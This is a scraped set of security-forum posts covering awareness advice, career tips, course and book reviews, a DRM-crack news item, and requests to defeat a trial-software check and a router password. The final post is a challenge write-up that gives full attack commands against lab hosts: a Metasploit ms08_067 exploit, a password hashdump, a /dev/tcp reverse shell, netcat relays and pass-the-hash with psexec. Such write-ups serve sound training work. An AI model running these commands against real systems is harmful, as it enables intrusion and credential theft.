fairly explicit and constantly uses bad language, but proves how much sensitive, personal information can easily be obtained from a small amount of research and a phone call. so what to do? well forget tech, it is people skills that fix this security issue.   getting your management and then the users working with you can make all the difference. most people want to help out, so imagine having even 10 percent of the company occasionally giving a heads up when something odd happens.  anything that makes our lives easier in the long run is worth a small amount of short term pain. these are my top three steps to “patching” users and making defending network a heck of a lot easier. get management buy in for security this is for senior management to understand and support a security stance for your company. it’s critical to explain the risk of not having a security in business terms, not technical ones. if they stand behind the policy, no-one is going to mess with it.  so when dave from finance wants to install his weird pda and its awful software, smile sweetly, glance at the policy - “i’m sorry dave, i can’t do that” unless he can prove to the bosses it’s important for the company, it stays off the network. this is the most important to have. if you can’t get this, you’ll spend all your time fighting security fires and getting blamed for the problems.  not a fun place to be, if you can’t get through to them the first time, try working with one of them to put your message in their language. the rules of the road are a good analogy to use; they are there to keep everyone safe and working in the same framework. driving down the wrong side of the street is instantly recognised as breaking the rules and dangerous. once the management team grasp this for their company’s security, most of the resistance will go. help write a solid, easy to understand security policy which protects the business, not cripples it don’t get carried away with technical details or writing a block everything document. talk to the different teams and find out what they need to do their jobs. then write the policy around those conversations, find a couple of senior managers to then present and explain it to.  doing this way will help create a policy that get you talking to other departments in your company and have them understand why security is important to protect their work and staff.  the fear, doubt and uncertainly (fud) of the dark magic that is it security can be dispelled by a couple for friendly chats and taking time to explain why pirated software and having full local admin rights to a machine is dangerous. it can bring up topics you may not have thought about, like modems attached to the finance desktops for banking apps, or the ad-hoc upload of files to ftp sites.  remember this is being written for non-technical staff to understand and it’s not details procedures. think of getting your grandparents to understand it and try to keep it to one page.  create a security awareness program even a simple “security tip of the week” posted to a company news letter, notice board, and intranet or added to it team’s email tag line is a great way to keeping user informed. you can always link to a web site for more details. use it to warn of new attacks and problems, like a spam flood. it helps keep everyone aware and may help to drop calls to you or the helpdesk!   if you also throw in tips for a safer home computing use, that gets a wider audience interested. warnings on what phishing scams are and how to deal with them affect everyone who does online transactions is an easy example. wrap up user can be the easiest path in to a network and no amount of system hardening can stop someone who has a legitimate username and password accessing the system. if you give these users a policy on what’s right and wrong, how to report and deal with a possible breaking of these rules, you just gained a whole new layer of defence that has only cost you some time and effort. just because youre the security guy, it doesnt mean you should hide in a dark corner and turn up when theres trouble. get out there, talk to people let them know you there to keep them safe and in a job.  getting the backing of your company and the security front line doesnt seem so unforgiving and lonely any more. some excellent resources of how to create a security policy and security standard can be found at sans  http://www.sans.org/resources/policies/?ref=3731  and nist http://csrc.nist.gov/publications/nistp ... 0-12-html/ training courses by sans, isc2 and ec-council, to name a few, can help build security people management skills which are well worth looking into for any future career moves up the food chain
3;[Article]-Course Review: Digital Mobile Forensics Deep Divenother month, another course review. hope all of you dont mind the continued attempt to give you the skinny on items that help you decide how to spend your hard earned dollars. let us know what you think, as we always strive to be fair and honest. permanent link:  [article]-course review: digital mobile forensic deep dive david caissy, cissp, gpen, gsec, ceh, pmp, b.sc.a.   digital mobile forensics deep dive is a 3-day course written and taught by wayne burke of  sequrit . i decided to take this course to expend my knowledge into a field i barely knew. being a penetration tester with a background in web application development, i was completely new to the forensic world. since the official web site stated that this was a “highly advanced and technical course,” i honestly expected to be completely lost. i thought i would learn more from home after the class, trying to slowly digest what the instructor said. with the site also stating that “about 80% of the course is focused on practical real world hands-on lab scenario exercises,” i decided to buy an airplane ticket and give it a try. i received the lab requirements by email directly from the instructor, wayne burke. the email included the laptop specifications and software that had to be installed such as vmware workstation. the instructor also mentioned needing backtrack 5 and caine (computer aided investigative environment) virtual machines. so i cleaned up some space on my laptop, downloaded what i needed and installed the two vms. i was eager to start the class.  do
0;Breaking in to Securityust some thoughts as this question seem to keep popping up.  this is just my humble opinion on some steps forward. you may have read stories, talked with friends or seen some of the tv/webcasts shows on “hacking” and decided you like to break in to the security industry. having solid computer skills, whether they are in programming, desktop, networking or a bit of a generalist is a good starting point for a security role. it has given you experience in the it industry and an idea of what some of the demands can be.  waking up one morning and saying “right, i’m starting a new glamorous life as a security expert today!” is a very positive thing, but is unrealistic. i quite fancied being an astronaut for a while and was a bit upset that i’d have to go through years of training, evaluations and compete with the best and brightest to even get a look in ( i know i could pay $20 million to be a space tourist, but that $20 million is taking a bit of time to save…) you need to plan ahead! work out what you want to do first there are a huge number of different security roles and jobs ou there, so before rushing in to expensive training courses, look at what you want to do in the security industry and try to pick a couple of jobs you could see yourself doing. getting information on your dream job will give you targets and goals on how to get there on how long it may take. break down the skills and experience those jobs are looking for, and then start doing some legwork.  by legwork, i mean talk to friends, start google searches, read interviews, listen to security podcasts turn up to local user groups or start posting questions to security forums.  build up skills and knowledge on the cheap having a clear idea of what you want means you can start gathering the skills, experience, tools and contacts to move on. courses and training are fantastic, but only worthwhile if you can use those skills to further your career. if you spend, say $3000, on training and never use the skills, is that the best use of your money and time? just because it a hot skill/certificate to have doesnt mean youll need it to get that job. get hands on practice   if you can’t get experience at work or school, build a test lab at home. build isolated test labs – vmware, ms virtual pc/server and mac’s parallels are excellent tools to have a safe test lab working environment to practice with. most software, including operating system can be downloaded as trial version, including microsoft products. many free tutorials are online that show you how to use a tool or how bad guys can attack you system. being able to see how something work and getting it to actually work is a great experience in itself and give out a number of valuable lessons.     never be tempted to “test” you newly download metasploit or nmap against someone’s kit. jail time looks very bad on a cv as does being fired for breaking company policy.  get involved  – look up local events and groups and join them. there are normally a number of local interest groups from sys admins, programmers, snort users, 2600 and local security interests. security folk need to have people skills for a number of reasons. two great reasons are you make contacts, which help you get know to the security market (possibly a job down the line!) and learn something you may never have though of.  join in on the many web forums. don’t be a lurker! if you don’t understand or know about a topic, tool or methodology, ask questions and get involved. use others knowledge to better your own. doing all this work before you start sending in you cv or wander in to a job interview will save you a huge amount of wasted time and heart ache. being prepared and knowledgeable is a core element for any security role.  if know what type of skills, experience and knowledge is required for the job your applying for before submitting yourself for the role and know that you can cover most of those requirements, you’ll beat 70% of the other applicants straight off. if you don’t have the experience, start with a job that gets you some of the experience or work for a company with a good name in the industry you’ll like to be successful in. use it as a stepping stone not as a road block. the people you talk with and meet may be able to help you down the road get the job you want.  good luck and dont get dishearten if you dont get interviews or a job straight off. it may take a while and some cv tweaking (dont lie!) to get your foot in the door for an interview. its up to you to present yourself as the best candidate for the role and impress that potential employer with your knowledge and understanding of the job. one pet peeve – if someone wants to know what you like to do in an interview avoid saying “i wanna be a hacker!” not the best impression to give. you’re a security professional. if you act and conduct yourself professionally, you’ll be treated like one and get the respect of your peers. some resources podcasts http://www.pauldotcom.com http://cyberspeak.libsyn.com/ http://sploitcast.libsyn.com/index.php?

2;DRM Cracked!ust got the following in my email inbox yesterday from xpnews.com..... windows media drm: cracked! many folks have said that they refuse to upgrade to vista because of its digital rights management (drm) technology that supposedly makes it impossible to play "ripped" music. drm is a controversial subject; its not just content thieves who hate it. many people who legitimately buy music and other protected content are outraged when they find theyre unable to play that content when and where they want after theyve paid for it. the biggest problem with drm is that it takes a "guilty until proven innocent" approach to copyright protection. and that angers those customers or potential customers who have no intention of stealing, but just want to be able to fully use and enjoy what theyve bought. last week, a new version of a popular drm cracking tool was released that, according to reports, removes drm protection from files without any degradation in the quality. this works on both xp and vista. my friend george ou wrote about it in his blog post: http://www.wxpnews.com/yx6btl/070724-ou-blog some folks are hailing this software as the solution to the drm "problem" - but theres just one minor problem with that: using it is illegal. under the digital millennium copyright act (dmca), which was signed into law in the u.s. by bill clinton in 1998, any act to circumvent copy protection is a federal offense. thats true even if you dont commit an actual copyright infringement. music companies, movie studios and other content providers, along with software vendors, keep trying to create "fool proof" copy protection systems but hackers keep finding ways to crack them. that leads the companies to impose ever more restrictive technology on their customers, and it turns into a vicious cycle. the thieves, who dont care about breaking laws anyway, still manage to access the content. the ones who suffer are the law abiding folks who have to put up with increasing inconvenience and limitations on their legitimately purchased songs, movies or software. i had one reader bring up an interesting theory. he thinks the availability of drm cracking software could actually lead to more sales for content providers. he notes that after downloading the crack, hes purchased a large number of songs because he no longer has to be afraid that hell spend the money and then the copyright protection technology will prevent him from playing them. it sounds counter-intuitive, but it actually makes some sense when you think about it. who wants to throw away money on something that you know from experience may not work? but if you know that you can rip out the drm that causes the problems, you might indeed be more willing to pay. just as some people argue that privacy invasions are okay because "if you arent doing anything wrong, you dont have anything to worry about," those same folks will often tell you that drm isnt a problem unless youre using stolen content or software. it would be nice if that were true, but taint necessarily so. a case in point: i just spent several days struggling with a sudden problem involving my nvidia display drivers freezing up on vista. ill be writing about it here in more depth if/when i find a solution, but it seems to be the problem described in this forum: http://www.wxpnews.com/yx6btl/070724-nvidia-vista at one point in the troubleshooting process, i was advised to download and install a certain update from microsoft. downloading it required going through the windows genuine advantage verification process. no problem, i thought. my copy of vista is legit and ive run wga verification on it many times. this time, though, i got a response that "this copy of windows did not pass genuine validation. either an unauthorized change was made to your windows license or a software program installed on this computer is not currently compatible with windows." whats up with that? this same copy of vista has passed with flying colors dozens of times in the past. and theres not a clue as to what change or software program is now causing it to fail. drm is far from perfect, and its imperfections are alienating a lot of people who might otherwise buy digital music. some have suggested that its the overall attitude of the record companies, from imposing drm hassles on their customers to instituting lawsuits through riaa, thats really responsible for slumps in sales and that the harder the companies try to exert dictatorial control over their customers, the more of those customers will desert them and turn to illegal downloading or just abandon digital music altogether. in fact, there is some evidence of the latter trend, in recent reports that sales of old vinyl albums and vintage cds are actually on the rise: http://www.wxpnews.com/yx6btl/070724-vi ... usic-sales what do you think? are content providers and software vendors shooting themselves in the foot by adding more and more layers of copy protection to their products? have you avoided installing vista because of fears about the drm? would you buy more music if you didnt have to worry about drm restricting your use of it after you pay for it? have you ever been denied access to windows updates due to wga verification failure even though you know your copy of windows is legal? would sales increase if companies just did away with drm completely? or are companies just doing what they have to do to protect their rights and keep dishonest people from stealing? let us know your opinions and experiences at  feedback@wxpnews.com
1;Ghost file/ entry created by program. Any help appreciatedey all, new here and i hope i posted this in the right forum if not please redirect it to appropiate section. appologies upfront. like to copy past my problem and maybe the real question i have what files or entrys this program creates during installation. i am german so please excuse my grammer. --------------------- problem: cracking or erasing an entry to overcome a trial period expiry of a small program. program: xaimer, poolstation or pool buddy. dear reader, i am no computer wiz but i know a few things or two. my problem is this program made for yahoo games pool. while playing it helps you aiming a shot. unfortunately it is a trial software and expires after 7 days than you need to pay the $24.95 or whatever. when you install the program it must create either some sort of ghost file or an entry in a registar so it knows when the 7 days are up. heaps of websites offer cracks but they dont work so i made it a mission to crack it.. their must be a way to find out during installation and than executing the program to find out what or where the program adds to the registar or creates a ghost file.. i also noticed that when you leave the software on for days past the trail time it still works.. so it must when you start it look and confirm with the entry when the software has been initialy installed.. - this is so far my try and fail.- i downloaded the program to one of my network pcs which never had this software installed however before that i downloaded a registar alert program to alert me while during execution or installation any win registar files are created or changed.. not much success. so once installed i run it and no registar alert either. so i used the search function to search for any files (inc. hidden file search) created or modified during the time period of 1day when it was installed. apart from the usual installed program files i found 2 xml documents that have been created and 2 *dll files that have been modified. i deleted the xml files and used a dll file editor to have a closer look which didnt tell me to much of what the file really is so since those two *.dll file have been created on that day i deleted them. search continued for anything (file name and context containing the file name) and everything i have found i deleted. back to the main computer where the trial run up.. searching for the same files and entryâs and deleting those.. so know that every single file or entry was erased that i could find had something to do with the program i went into dos and done a search again (created/ modified files) hoping that i might get more results.. nada, seemed like that any file association was erased.  thinking now that if i reinstall it will work i was disappointed by getting again the screen "trial period expired". i even got as desperate to go into bios and change the time backwards to the day it was installed with no success. i also forced format c:/mbr to clean the boot record. no luck.. this is really getting frustrating for me and somewhat iam sure you get that to that i wont give up. so my last resort is to ask people with a bit more programming and lib experience to solve this. the program is called xaimer and can be downloaded from here.. i uploaded it to my host as the developer does not seem to offer it anymore. (direct temp download link) http://www.ozisu.com/christemp/xaimer3.exe their are also 2 other programs like "pool station" and "pool buddy" which seem to have the same interface and same deal with the 7day trial period.  download link for pool station is: http://www.stationsoftware.com/pool/index.html and pool buddy is: http://www.playbuddy.com/download/pbudysetup.exe i also tried both of these with the same method however still got the same result getting the "trial expired screen". i would say that xaimer and poolstation copied the coding of pool buddy or even they are the same developers. please do not post links to cracks as i have tried them all and do not work unless you know a link that is 100% legit.  if you find a solution or maybe point me in a direction to solve this myself it will be most appreciated. cant offer you fame or fortune but host space, i am into music production so happy to send production softwares, plugins and even post on cd 20gb of samples.  preferably email me your results to  chris_schumann1982@yahoo.com.au  or reply here. thank you for your time. kind regards, chri
3;A whole new family of exploitshis article indicates that there may be a whole new family of exploits about to hit the streets. http://www.securityfocus.com/news/11477 the poc is going to be shown next week at the black hat security briefings in las vegas - anyone on here going ?. the annoying thing is that the exploit is built around a vulnerability in iis5 that was notified to ms in dec 2005 - how slack is that
2;Java Exploits on the Riseice small rant by eweeks larry seltzer: opinion: things were supposed to be different with java and security, but now that the heat is really on, javas turning out to have many of the same security issues as other platforms. id seen it myself recently, but symantecs security response team has officially noticed that attacks on java are on the rise.  we were all probably a little too naive back in the mid-90s when java came out promising, among other exaggerated claims, immunity from security problems. there were always some java security issues, but they werent realistic threats, just proofs of concept that nobody would bother to implement.  most of the higher-profile problems seem to be more in the interface between java and the outside world. recall earlier this year, when there were a series of high-profile security flaws in the quicktime java interface. there have also been a series of vulnerabilities in recent months in java web start. the news in these cases was about vulnerabilities and not about exploits. some of the exploits are purely in the java end of things, and they turn out to be the same sorts of software operations that are prone to vulnerability in non-vm software. consider the recent vulnerability in javas image parsing code. the parsing of data coming out of files seems to be a never-ending source of security issues in all platforms. many such problems in less-famous applications go largely unpublicized, even when they are properly reported and fixed by the vendor. and java is a relatively standard part of the internet landscape and malware authors seem to be getting around to it. the reason symantec wrote their blog was because these exploits are starting to show up on their massive world-wide honeypot network. i have seen other public reports of malicious java code, such as this one from the isc.  it could be that were just getting started with java as an exploit platform. symantec notes, for example, that javas heap management makes it possible for it to be used to develop heap spraying code. (see this other symantec blog and the links in it for more on heap spraying and heap feng shui, now-popular techniques for throwing code up against the wall to see what sticks.) if these could be made largely reliableâeven if it only worked 50 percent of the time that would be more than enoughâjava is on a steep slide into trouble. its not clear to me whether a rewrite of javas heap management to address the problem would cause compatibility problems for actual java code. symantecs advice for dealing with java security issues is disturbingly mundane: keep your java implementation up to date, use an ids/ips (intrusion detection system/ intrusion prevention system) and keep the signatures up to date, dont browse unsecure web sites, etc. just like with non-java products.  but, werent things supposed to be different? original story: http://www.eweek.com/article2/0,1895,2161797,00.asp do
0;My review on the GCIH Course - @ a SANS Conferencehe course :  http://www.sans.org/training/descriptio ... 8e7ec797d3 quick background - i come from a network background and spending a good deal of time hardening and protecting systems from their user and sometimes bad guys.  i wouldnt rate my attacker skills past a very limited script kiddie on a good day. :-) the companies ive worked for engaged pen testers to find the holes, then i work with them to understand and fix those holes. i had the chance to attend a sans conference as a volunteer,  http://www.sans.org/training/volunteer.php  - so jumped at the opportunity to see life from the other side of the fence.  i wont go in to what happens as one of the volunteer, it’s great fun but long hours! the course is 6 days in length. five days of labs and lectures followed by day six, the hacking challenge (more on this later) starting at 9am and finishing around 5pm, with breaks and lunch,  the class was just under 30 people of all backgrounds. we had military, government, education, law enforcement, a number of fortune 500 and a mix of random folks. ages ranged from early 20s up to people whod work with vax systems when they were new and shiny - obviously in their late 100s :-)  we got a book for each day, a couple of cheat sheets and a cd containing a vmware image of a pre-built linux system, load with tools for the coming practicals. our instructor was mike poor, a good friend of and works with, ed skoudis, the course author.  id been in mikes phenomenal intrusion detection sans class the year before, so knew i was in for a crammed 6 days. he covers not only the course work, but real world events he actually worked on and interacts with the class to get the best of their experiences too.  mike loves to run demo, so you spend a great dealt of the time watching him perform the slides, rather than talk through them. i found watching someone else go through the process first, made it easier to attempt it later on myself.   the first days is all about the basic of incident handling. making sure you have the backing plans, knowledge and tools ready to deal with incidents in the it field. it the “talked at” day as it cover a wide breadth of information ranging from dealing with the law to what you should have in you incident response bat utility belt. i could see a number of the class twitching to get on the “good stuff” but i like having a plan before playing with fire. it saves getting burnt too badly  the evening held an intro to vmware and linux for us poor un-enlighten windows types days two to five plunged in to hacking tools and techniques and kept going. from the seemingly shallow water of google hacking and netcat, into the colourful windows exploits, linux privilege escalation, versatile metasploit, crashing in the murky deeps of buffer overflows and format string attacks. mike used the books as reference point, but took us off exploring and experimenting with the tools against our own systems and with linux system vmware image.  despite the different skill sets, backgrounds and knowledge of everyone in the class managed to keep up and get to the end of day five in almost one piece mentally.  day six is the day where you get to throw everything you’ve learnt at a special network. the class was broken in to small teams and given the permission to attack it! you can use all the tools, tricks and cheats at your disposal in any effort to be the first team to crack all the arrayed systems.  it’s a pretty crazy day, with all sort hacking madness and the odd practical joke on a rival team.  i hugely enjoyed the six days, felt i learnt a lot and meet some great people. the knowledge acquired makes me a better defender as i can see how the other side may come at me.  i still wouldn’t class myself as a skilled attacker, but could be mildy dangerous if backed in to a corner ;-) pros * sans is a known, respected security educator * six solid days of focused learning, being taught by someone with a passion of the subject and plenty of real world experience to boot * the instructor - all the sans instructors are very approachable, down to earth and really know their stuff. * the classmates – it’s great to meet peers, swap stories and hangout with like minded people. i picked up some great tips and ideas from  *plenty of tools –    lots of books, one for each day – the books are full of walkthroughs exercises so easy to review during and after the event.    cd with the linux image load full of tools to provide a safe test zone,    mp3 files of the six days to help retain the information. * day six – a world of pain and mayhem  * the exam is getting more solid recognition from employers in the security fields  cons * cost – it’s a big bunch of money, plus travel and accomodation * six days doesn’t seems long enough to learn that much information * taking the exam is extra expens
1;Router User Pass Hacki, my isp provided me with a router that neither they nor i know the password to. they pointed me towards the manufacturer to get the password but they dont know it either. the isp obviously changed some settings in it to get it to work with the dsl connection. im trying to set up apache and i need to get into the settings of this router to effectively know what is going on with my network. does anyone here know a way to get the user and pass details for this router? i thought about using brutus, would this be the best approach
1;DVWA problem: removing iti, i have a problem. i have recently installed dvwa on my laptop running bt5. i think i have made a mistake, because i didnt install it on a virtual machine and the dvwa documentation says to install it on a host solely used for pentesting or virtual machines (i use my laptop for several purposes) due to the security risks that could compromise my laptop. so, how can i fix it? ive tried to removing it and reinstall it later in virtual box, but i dont know how to do it.  ive installed it with the unl33ts script. thank you for your hel

1;Any Network Architects  out there? Need Some information about  these Networks?s the title says i am trying to understand about various things related to network design,after i read some news regarding the stuxnet worm my interest about understanding  the industrial network architecture got increased, _____________________________________________________________________ 1) i am trying to understand about the network structure of the satellite command centre,i am not interested in understanding about the plc,power and other circuit related system,i am interested in understanding about the it part of such networks? how does a satellite network differs from a ordinary network? also i had seen in some news there are some freaky super computers out there,wondering what type of network design and security they have? i am guessing it is not designed like an ordinary corporate network, i am sure some "ingenious measures and technologies" out there to protect such networks, also i had seen in some scenarios that military people uses "satellies for routing",just amazed about these high-tech stuff, but again i can not able to find any information or any clue about how these networks are designed and secured.. i am  much interested in understanding about these hi-fi things, but as far as i have seen "most security experts" does not know much about these things,so i decide  to some network architects ,i am sure you guys known these things better than a security professional,so decided to ask here.. can any point me to some nice links for understanding these concepts? _______________________________________________________________ 2)now my questions id regarding understanding the ordinary corporate networks, because i believe network security starts from the network designing it-self, i am focusing on understanding about the organizations network model, because by seeing them i might get some ideas about the network desigining,how a organizations network looks like and bla bla.. also when i am trying to  looking for any previous network models of any corporates,i can not able to find,still dont know why these kind of informations can not be found on internet(  )? for example  i had asked about the network model in the sense of understanding the entire corporate structure,not some star like topology like that, for example take an  mnc as example,for example say tcs, assume they are running their offices all over world, say 30 countries,and say they have 10 sub-offices in each country,and each country have a networking command centre and at-last those 30 command centres from different countries are linked to a top most command center, ,i guess their network structure look like these,but in general,i want to know about the over-all network structure starting from the top command center. for some guys this thread may looks noobish,but i am asking in the sense to learn and understand about such network design and its implementation etc... hope some network architect with bit of patience will help me  ;

1;Endpoint Security by Mark Kadrich Book Reviewthink that richard bejtlich hit the nail on the head with his review. the book makes some sound points, like "we rely on the vendors to tell us what the solution should be instead of turning the formulation of a solution into a science" and "as devices connect to or leave the network, the perimeter changes, and so our security policy must adapt" but these arent necessarily new ideas. the sound points are heavily diminished by the books lack of focus. its hard to say that he jumps around in a chapter because "the chapters" are laid out well and cover what they say they are going to cover but i kept reading waiting for him to get to the point of how to make my network and endpoints more secure. i got to the end of the book and i dont feel we ever got there. the short answer is that he recommends using system hardening (baselining) and a nac device to ensure secure configurations to protect your endpoints. he says end point devices are anything that extend outside your perimeter, the author breaks these up into: windows, non-windows, embedded (printers, routers), mobile phones & pdas, palm, blackberry, windows ce/windows mobile, and symbian os. i had a couple of issues with his using a nac as the end all, be all solution. for the sake of argument ill concede that a nac solution should protect my lan from someone walking in an plugging in an unauthorized device or keeping a client that does not meet my specifications off the lan by quarantining them (even though ofir arkin has spent plenty of time proving this isnt necessarily the case). what the nac solution doesnt protect against is a public facing server with a vulnerability, those million client side "i got you to click on my link" exploits, or protect the network from any mobile devices (av ends up being our only solution minus any baselining we can do). i had issues with his unwaivering trust in nac solutions and those agents that most of the time make that happen. ch 6 starts off interestingly enough talking about how he doesnt trust software vpn solutions because they can have flaws but all throughout ch5 we are told to use nac solutions that require a closed source agent to be installed on the endpoint. what gives? ill take a mature open source solution over a relatively young closed source solution any day. the book has chapters (8-12) on baselining windows, os x, linux, embedded devices (printers), and mobile devices. while not technically incorrect, its adds very little to existing information and is certainly not enough information to confidently lock down any of the systems mentioned. the mobile device threat and mitigation section which is probably the biggest threat to the current network is covered much better in blackjacking. i was also disappointed to see nmap version 3.00 being used for scanning. nmap v3.0 is years out of date. my last set of gripes is with the authors assertion that we need to change our network diagrams (page 60). he says that we should throw out the visio type diagrams and go with an engineering/circuit board type diagram. i found myself having to keep flipping back to see what the symbols meant. he gave the example of if you asked 3 network engineers to draw a diagram of a network you would get 3 different diagrams, but i would say that it doesnt matter if they use a firewall with a wall and flame or a wall with hatch marks 9 out of 10 times everyone will recognize that as a firewall where his version of a firewall that is two triangles with their points meeting may not be recognized. the informit site used to have chapter 3 as a preview so you could see for yourself (wasnt working when i wrote this). the book does have some good points, the idea of the ever changing perimeter that includes mobile devices as endpoints is a good way of looking at the current problem we have on hand. i also agree with the author on page 69 that "we have many security tools that can function as integral and derivative controls, but these tools are acting independently of each other and are not tied to a central controllable proportional process." i think he raises some good points but doesnt quite deliver on a solid way to fix those points in the book
0;Skillz December 08 Winning Entry - Technicalark baggett santa’s macintosh had received an ip address of 192.168.1.110.   he fired up his virtual machines with bridged networking and ran a quick network scan to identify the hosts he saw on the network diagram using the following command. #nmap –sv –n –pn 192.168.1.1/24 several minutes later he had identified the following hosts on his network segment 192.168.1.10 burgermeister’s jailmaster laptop 192.168.1.20 web1 webserver with command execution vulnerability 192.168.1.30 door1 computer with dooropen.exe 192.168.1.110 santa’s macintosh 192.168.1.111 santa’s virtual linux machine 192.168.1.112 santa’s virtual windows machine here is santa’s plan.  he will use the existing login for the burgermeister on his jailmasterlaptop to launch dooropen.exe on door1.  if you dont specify credentials psexec will logon to the remote host using the currently logged on user.   but santa had a couple of obstacles to overcome first.   first he needs an interactive session with the burgermeisters currently logged on account.   then he needs to do some port hopping around firewall and iptables rules to hit the door1 with psexec. ?? vnc is a nice easy way to grab an interactive desktop and metasploit is happy to provide.  so santa typed the following line: ?? ./msfcli exploit/windows/smb/ms08_067_netapi payload=windows/vncinject/bind_tcp rhost=192.168.1.10 e ??in one swift command he had the interactive desktop with the jailmasterlaptop   from there he could easily could copy psexec to der burgermeister’s machine and use his existing credential to open the door.    santa pressed enter on his metasploit attack and to his surprise found that the burgermeister had logged off of his computer preventing him from  carrying out his attack.   the wizard thought to himself, “if santa had been paying attention earlier he would have known the burgermeister had logged off”.     as santa’s mind churned to come up with plan b he sat and watch the burgermeister’s screensaver cycle through pictures of burgermeister as a young man at 2600 meetings.    then, like a stomachache after a night of binging on cookies and milk, it hit him.   he could pass the hash.   he broke his attack into 4 phases. 1)	acquire hashes for the jailmaster account from burgermeister’s pc to use for a pass the hash attack on door1 2)	gain shell access to the linux web server so we can use it as a relay to access door1 3)	setup netcat relays from santa’s virtual windows box through his own linux virtual machine and the web server to door1  4)	pull it all together and launch the attack.  aka: use the stolen jailmaster hash, our netcat relays and psexec to run dooropen.exe step 1) acquire hashes from the burgermeister’s pc santa closed his vnc window and changed his payload to the meterpreter so that he could get a copy of the burgermeisters hash using its hashdump feature.   santa changed his command to this: ./msfcli exploit/windows/smb/ms08_067_netapi payload=windows/meterpreter/bind_tcp rhost=192.168.1.10 e??   and saw this.. [*] meterpreter session 1 opened (192.168.1.111:58220 -> 192.168.1.10:4444) meterpreter > santa typed “use priv” meterpreter > use priv and get this response  [-] the priv extension has already been loaded. since santa had a newer version of metasploit and his exploit has administrative access meterpreter.rb automatically loaded the priv module for him  ( http://trac.metasploit.com/changeset/5427 )  so santa typed: meterpreter > hashdump and saw this (among the other smattering of default accounts) jailmaster:500:aad3b435b51404eeaad3b435b51404ee:5311fb075df1fe96efcbd51d6b9e0dcf::: santa could tell right away that burgermeister had renamed his default administrator account to jailmaster because of the 500 rid in the hashdump results.   the jolly old elf saved this information for later use.   right now he needed shell on the webserver. step 2) gain shell on the webserver. santa used the remote code execution vulnerability on the web server to shovel a bash shell back to himself using /dev/tcp first santa setup a netcat listener on his virtual linux computer.    nc –l –p 5500 then he entered the following into the address field of is firefox browser. http://192.168.1.20?vulnerablepage.php? ... sh%20-i%20 > /dev/tcp/192.168.1.111/5500%200<&1 initially it appeared as though nothing happened.   this command doesn’t make the familiar bash prompt appear on the netcat listener, but it had in fact shoveled a bash prompt over /dev/tcp back to his virtual linux host.  since it uses an outbound connection, the iptables rules did not prevent the connection.   now santa had a shell on the linux server and was ready to setup his netcat relays.  step 3)  setup some netcat relay magic to bypass the firewalls and get the computers domain name from door1 as  kris looked at the network layout he gave a jolly chuckle.   the burgermeister wasn’t using any egress filters on his linux box.   this meant he could use the uber-cool netcat “gender bender” relays he had recently learned about at sans training.  kris setup the following series of netcat relays: on his linux virtual machine (192.168.1.111) he typed the following command establishing a listener to listener netcat relay: #mknod backpipe p #nc –l –n –v -p 445 0<backpipe |  nc –l –v -n –p 54000 > backpipe a simpler version would be # nc –lp 445 0<backpipe | nc –lp 54000 > backpipe but previous experience had shown him that the “open” and “connection from” messages generated by netcats verbose output (-v) are very helpful when troubleshooting timing issues that arise when using complex netcat relays.    on the shell he had previously shoveled over /dev/tcp from linux webserver he prepared the following statements begin careful not to press enter on his netcat relay yet. #mknod backpipe p #nc –nv 192.168.1.30 445 0<backpipe | nc 192.168.1.111 54000 > backpipe because this uses two netcat clients which are tied together it will be unaffected by the iptables firewall running on the webserver.   the netcat client will connect outbound on port 54000 to the waiting listener on his linux box.  at the same time it will connect to port 445 on door1.  kris knows that he has to use the netcat connection to the smb service on the door1 server within a second or two of establishing the connection.   so, he also prepared the following statement on his windows box at a command prompt. c:\>net use \\192.168.1.111\ipc$ /u:”” “”  this would connect to the netcat listener on his linux box which is relayed through the netcat chains to the smb listener on door1. then, working quickly to avoid a timeout, kris pressed enter on his netcat client to client relay quickly followed by enter on his net use statement.  his net use statement returned “command completed successfully.” confirming the deed had been done and his relays worked.  santa then typed  c:\>nbtstat –a 192.168.1.111  the nbtstat command traverses the relays to door1 and returns something like this: name   			type   	status door1   	<00>		unique 	registered workgroup <00>	group	registered … armed with his the domain name (workgroup),  the jailmaster hash, psexec and a successful netcat relay,  santa was ready to pull off the attack. santa tore down his netcat relay being sure to delete the existing smb connection from his windows box that used the null sessions.  when he hit control-c on his netcat relay it tore down both his relay and his shell so he had to set everything back up.  first santa deleted his null session: c:\>net use \\192.168.1.111\ipc$ /delete then he set up his client to client relay exactly as he had before.   first shoveling his shell over /dev/tcp, then setting up the exact same client to client relay being careful not to press enter yet.  this time he would use the relay to connect with the jailmaster login.   he prepared the following statement on his windows box c:\>net use \\192.168.1.111\c$  with both of those commands typed and ready to be launched santa needed to load the jailmaster hashes into memory to pull off his attack. step 4)  pulling it all together santa asked the wizard to download a copy of the pass the hash toolkit from core impact and provided him with this url:   http://oss.coresecurity.com/projects/pshtoolkit.htm   the windows binaries are only 179k and the wizard will have no trouble downloading it. he put the pass the hash toolkit on his windows virtual machine and uses iam-alt.exe to load the jailmaster hash into his computers memory.  (iam-alt.exe provides support for a wider range of operating systems and seems to be more reliable than iam.exe) to load and use the credentials kris needed to provide iam-alt.exe with four pieces of data.   he needs a username, a domain, an lm hash and an ntlm hash.  he can use the username and hashes he got from the burgermeister’s laptop using meterpreter’s hashdump.    he will use the domain name he acquired earlier with nbtstat.  kris loaded his hashed password into his computers memory by typing the following on his virtual windows computer. c:\>iam-alt.exe –h jailmaster workgroup aad3b435b51404eeaad3b435b51404ee 5311fb075df1fe96efcbd51d6b9e0dcf this loaded the jailmaster hash into the memory of lsasrv.dll for his windows workstation to use.    windows will pass those credential over the series of netcat relays as follows: santa’s windows computer with the jailmaster hash  ?  santas linux box netcat listener on 445  ? santas linux box netcat listener on 54000  ->  netcat client on webserver1 port 54000 -> netcat client on webserver1 on port 445 -> smb server service running on door1 (note that arrows represent the flow of the credentials once the tcp connections are established, not the direction in which the connections were established.) santa pressed enter on his netcat relay on webserver1 followed quickly by enter on his net use statement and saw: command completed successfully. he then typed the following command on his windows box c:\>psexec \\192.168.1.111  dooropen.exe the door opened. free from their bondage, santa, jessica and the wizard went straight to work.   they installed all of the patches on the burgermeisters laptop being careful not to overlook third party applications like adobe reader, flash and apple quicktime.   they installed apache modsecurity on web1 and configure a filter to prevent the command execution attack.   then they hardened its iptables rules restricting outbound connection to only stateful responses.  he also setup an ossec on the linux server to notify the burgermeister via email when anyone made file system changes or attacked his webserver.  then santa, being santa, reconfigured the burgermeisters computer so that it would dual boot between windows and linux.   to make it easy for the burgermeister santa installed backtrack3 on his other partition.   just as he finished the burgermeister barged through the door screaming guards arrest them!  when he got to his computer and saw want santa had done, he began to cry.   burgermeister shared the story of how in the 90s he had tried his hand at 